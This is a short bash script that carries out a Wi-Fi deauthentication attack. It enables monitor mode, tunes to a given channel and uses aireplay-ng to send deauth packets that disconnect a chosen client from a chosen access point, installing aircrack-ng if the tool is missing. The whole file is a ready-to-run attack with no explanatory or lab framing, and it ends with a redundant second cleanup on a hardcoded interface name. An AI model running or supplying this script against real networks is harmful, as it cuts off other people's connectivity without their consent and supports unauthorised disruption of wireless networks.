#!/bin/bash

# Arguments
INTERFACE="$1"
AP_MAC="$2"
CLIENT_MAC="$3"
CHANNEL="$4"

if [[ $EUID -ne 0 ]]; then
    echo "[!] Run as root!"
    exit 1
fi

# Check dependencies
if ! command -v aireplay-ng &>/dev/null; then
    echo "[!] aireplay-ng not found. Installing..."
    sudo apt install -y aircrack-ng
fi

# Enable monitor mode
echo "[+] Enabling monitor mode on $INTERFACE..."
sudo airmon-ng start "$INTERFACE"
MON_INTERFACE="${INTERFACE}mon"

# Set channel
sudo iwconfig "$MON_INTERFACE" channel "$CHANNEL"

# Deauth attack
echo "[+] Sending deauth packets..."
sudo aireplay-ng --deauth 20 -a "$AP_MAC" -c "$CLIENT_MAC" "$MON_INTERFACE"

# Cleanup
echo "[+] Stopping monitor mode..."
sudo airmon-ng stop "$MON_INTERFACE"
echo "[+] Deauth complete."
echo "Disabling monitor mode..."
sudo airmon-ng stop wlan0mon